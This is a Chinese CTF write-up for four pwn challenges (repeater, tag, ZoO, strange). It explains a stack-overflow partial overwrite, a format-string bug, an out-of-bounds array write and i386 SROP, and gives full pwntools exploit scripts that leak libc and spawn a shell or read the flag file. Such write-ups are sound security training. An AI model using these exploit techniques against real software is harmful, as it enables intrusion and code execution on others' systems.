补一下二队内测题。

## repeater

> [easy] Repeater
>
> As is well known, CTFers are all repeaters!
>

栈溢出题目，`sub_11C9()` 可以栈溢出，只修改返回地址的 1 字节，可以做到 partial overwrite 无限循环 `sub_11C9()` 读入 payload。

这里讲一下 `fread` 等 FILE 相关函数，后面也会用到。

[[C 语言 FILE 函数]]

既然没有空字符阶段，printf 就会把 retaddr 打印出来，从而获得 pie base。

接下来的问题是怎么泄漏 libc，ropper 发现程序没有一个能用来控制 rdi 的 gadgets，细心会发现程序在结束 printf 后寄存器 rdi 上居然还保存着 libc 函数的地址，那直接 `call puts` 就可以泄漏了。

```python
from pwn import *

proc = "./pwn"
context.binary = proc
context.log_level = "debug"
io = process(proc)
# io = remote("tld1027.com", 9030)

elf = ELF(proc)
libc = ELF("./libc.so.6")

if args.G:
    gdb.attach(io)

payload1 = b'a' * (0x110 - 1) + b'b' * 8 + b"\xb8"
io.recvuntil(b"You say:\n", drop=True)
io.sendline(b"281")
# input()
io.send(payload1)

io.recvuntil(b"bbbbbbbb", drop=True)
main_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8,b"\x00"))
pie_addr = main_addr - 0x12b8
log.info(f"pie_addr ===> {hex(pie_addr)}\nmain_addr ===> {hex(main_addr)}")

payload2 = b'a' * (0x110 - 1) + b"cccccccc" + b"\xb3"
io.recvuntil(b"You say:\n", drop=True)
io.sendline(b"281")
io.send(payload2)
io.recvuntil(b"cccccccc", drop=True)
io.recvuntil(b"\n", drop=True)

fun_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc_base = fun_addr - libc.symbols["funlockfile"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
pop_rdi_ret = libc_base + 0x000000000002a3e5
ret = pie_addr + 0x101a

log.info(f"funlockfile_addr ===> {hex(fun_addr)}\n")
log.info(f"libc_base ===> {hex(libc_base)}\n"
            f"system_addr ===> {hex(system_addr)}\n"
            f"binsh_addr ===> {hex(binsh_addr)}\n"
            f"pop_rdi_ret ===> {hex(pop_rdi_ret)}"
)

payload3 = b"a" * (0x110 - 1) + b"dddddddd" + flat([pop_rdi_ret, binsh_addr, ret, system_addr])
io.recvuntil(b"You say:\n", drop=True)
io.sendline(f"{len(payload3) + 1}".encode())
io.send(payload3)
io.interactive()
```

## tag

> [mid] tag
>
> There is a fmt vulnerability, but it seems impossible to trigger.
>

这题也不难，首先目标是把 v6 改成 1，可以发现在配对 tag 的时候，对于后标签只匹配了 `</`，导致可以 partial overwrite。

把 old_char 设置成 `\x00`，`new_char` 设置成 `\x01`，然后就可以打格式化字符串了。

```python
#!/usr/bin/env python3
from pwn import *

proc = "./pwn"
context.log_level = "debug"
context.binary = proc
io = process(proc)
elf = ELF(proc)
libc = ELF("./libc.so.6")

if args.G:
    gdb.attach(io)

io.recvuntil(b"Input >\n", drop=True)
payload1 = b"<" + b"\x00" + b">%11$p.%18$p.%29$p.bbbbbbbbb</"
log.info(f"payload1 len ===> {len(payload1)}")
io.send(payload1)

# one
io.recvuntil(b"Old tag to replace [q to quit] >\n", drop=True)
io.sendline(b"\x00")
io.recvuntil(b"New tag >\n", drop=True)
io.sendline(b"\x01")

# two
io.recvuntil(b"Old tag to replace [q to quit] >\n", drop=True)
io.sendline(b"1")
io.recvuntil(b"New tag >\n", drop=True)
io.sendline(b"2")

io.recvuntil(b"<"+ b"\x01" + b">", drop=True)
IO_fw_addr = int(io.recvuntil(b".", drop=True).decode(), 16) - 45
str_addr = int(io.recvuntil(b".", drop=True).decode(), 16)
stack_addr = int(io.recvuntil(b".", drop=True).decode(), 16) - 0x200

log.info(f"IO_fw_addr ===> {hex(IO_fw_addr)}\nstr_addr ===> {hex(str_addr)}\nstack_addr ===> {hex(stack_addr)}")
libc_addr = IO_fw_addr - libc.symbols["_IO_file_write"]
pie_addr = str_addr - 0x2069
log.success(f"libc_addr ===> {hex(libc_addr)}\npie_addr ===> {hex(pie_addr)}")

ret_addr = stack_addr + 0x90
log.success(f"ret_addr ===> {hex(ret_addr)}")

ret = pie_addr + 0x000000000000101a
system_addr = libc_addr + libc.symbols['system']
binsh_addr = libc_addr + next(libc.search(b"/bin/sh"))
pop_rdi_ret = libc_addr + 0x000000000002a3e5

log.success(f"system_addr ===> {hex(system_addr)}\nbinsh_addr ===> {hex(binsh_addr)}\npop_rdi_ret ===> {hex(pop_rdi_ret)}")

payload2 = fmtstr_payload(8, {ret_addr: pop_rdi_ret, ret_addr + 8: binsh_addr, ret_addr + 16: ret, ret_addr + 24: system_addr}, write_size="short")
io.sendline(payload2)

io.interactive()
```

顺带一提 pwntools 的 fmtstr_payload 针对 x64 的模块已经修好了，真好使啊~~两年前还是坏的~~

## ZoO

> [hard] ZoO!
>
> Welcome to the zoo! You can feed the small animals here. The flag is placed in a location that you cannot touch.
> 
> PS:
> The flag is a series of numbers, and the complete flag format is t1dctf{***}.

这题折腾了挺久的，总算是完整复现出来了（（

第一个点在于逆向结构体，这里总结了点[[逆向结构体的经验]]。

第二个点在于找溢出，不过如果第一个逆清楚了的话其实这里问题不大，显然是存在数组越界的，对于同一个 bin 可以创建 5 个 entry，前 4 个填满数组，第五个相当于越界读写，可以写 ret addr。

第三个点在于找利用链，这个题没给任意地址写，只有部分地址写，所以没办法构造 ROP 链子完整泄漏 libc 打，但是题里有一个 `backdoor`:

```nasm
endbr64
push    rbp
mov     rbp, rsp
mov     [rbp+var_8], rdi
mov     [rbp+var_10], rsi
pop     rbp
retn
```

相当于会把 rdi 和 rsi 存下来，我们去 ret addr 看看，发现 ret 时 rdi 是 func1 里用到的 map 地址，rsi 是 `useless`，那么直接调用 view 函数就可以把 flag 打印出来。

第四个点在于这个 view 函数不能从头开始调用，否则会 segment fault 退出，这是因为 gift 函数在 ret 时缺少了 `mov rsp, rbp`，解决方法也简单，从 `view + 5` 开始调用就行。

```python
from pwn import *
from sys import argv

proc = "./pwn"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

io.recvuntil(b"ZoO!")

if args.G:
    gdb.attach(io, "b *$rebase(0x1483)\nb *$rebase(0x1a07)")


def feed(name, amount):
    io.recvuntil(b"> ", drop=True)
    io.sendline(b"1")
    io.recvuntil(b">\n", drop=True)
    io.sendline(name)
    io.recvuntil(b">\n", drop=True)
    io.sendline(str(amount).encode())


# pause()
feed(b"1", 1)
feed(b"1F", 1)
feed(b"1FF", 1)
feed(b"1FFF", 1)

log.info("four")
feed(b"1FFFF", -0x4fc+5)

io.interactive()
```

## strange

> [Inferno] strange!?
>
> I heard you're good at orw? Give this a try!
> 
> PS:
This is not the kernel! This is not the kernel! This is not the kernel! But debugging techniques used for the kernel can be employed for debugging. Pay attention to subtle differences caused by local and system kernel versions!

题目给了 qemu 启动脚本和一个内核文件系统，看看里面的 hello，发现是个没用调用任何库函数的 i386 程序，只开了 NX，提示打 orw。

问题是程序本身的 gadgets 非常少。

这里提一下 SROP，这里需要提一下，`sigreturn` 这个系统调用和别的系统调用有一个不同的地方，即一般的应用程序不会主动调用它，而是由内核将相应地址填到栈上，使得应用进程被动地调用。因此在系统中一般会有一段代码专门用来调用`sigreturn`，在不同的类UNIX系统中，这段代码会出现在不同的位置，如下图所示：

![](https://pic.imgdb.cn/item/6735971bd29ded1a8c516119.png)

所以可以在这个 hello 程序的 vdso 里找到相当多的 gadgets。

有一个点是 SROP 时需要把段寄存器设置正常，不然程序在系统调用的时候会 down 掉，一开始的时候不知道这个一直打不通闹麻了。

```python
from pwn import *
from sys import argv

proc = "./hello"
context.log_level = "debug"
context.binary = proc
context.arch = 'i386'
elf = ELF(proc, checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io)

vdso_addr = 0xf7ffc000
stack_addr = 0xffffccbc
int_0x80 = vdso_addr + 0x00000577
read_addr = 0x8049000
sigreturn_addr = vdso_addr + 0x00000591
resigreturn_addr = vdso_addr + 0x5a0
ret_addr = vdso_addr + 0x0000057c

io.recvuntil("!\n")

frame = SigreturnFrame(kernel='i386')
frame.eax = 5 # open
frame.ebx = stack_addr
frame.ecx = 0
frame.edx = 0
frame.ebp = 0
frame.eip = int_0x80
frame.esp = stack_addr + 0x24 + 80

# 段寄存器要恢复
frame.cs = 35
frame.ss = 43
frame.ds = 43
frame.es = 43
frame.fs = 0
frame.gs = 0

frame2 = SigreturnFrame(kernel='i386')
frame2.eax = 3 # read
frame2.ebx = 3
frame2.ecx = stack_addr + 0x200
frame2.edx = 0x20
frame2.eip = int_0x80
frame2.esp = stack_addr + 0x24 + 80 + 4 * 3 + 4 + 80
frame2.cs = 35
frame2.ss = 43
frame2.ds = 43
frame2.es = 43
frame2.fs = 0
frame2.gs = 0

frame3 = SigreturnFrame(kernel='i386')
frame3.eax = 4 # write
frame3.ebx = 1
frame3.ecx = stack_addr + 0x200
frame3.edx = 0x20
frame3.eip = int_0x80
frame3.esp = stack_addr + 0x24 + 80 + 4 * 3 + 4 + 80 + 4 + 80
frame3.cs = 35
frame3.ss = 43
frame3.ds = 43
frame3.es = 43
frame3.fs = 0
frame3.gs = 0

payload1 = b"./flag\x00".ljust(0x20, b"a") + p32(sigreturn_addr) + bytes(frame)
payload1 += b"aaaa" + b"bbbb" + b"cccc"
payload1 += p32(sigreturn_addr) + bytes(frame2)
payload1 += b"aaaa" + b"bbbb" + b"cccc"
payload1 += p32(sigreturn_addr) + bytes(frame3)
io.sendline(payload1)

io.interactive()
```

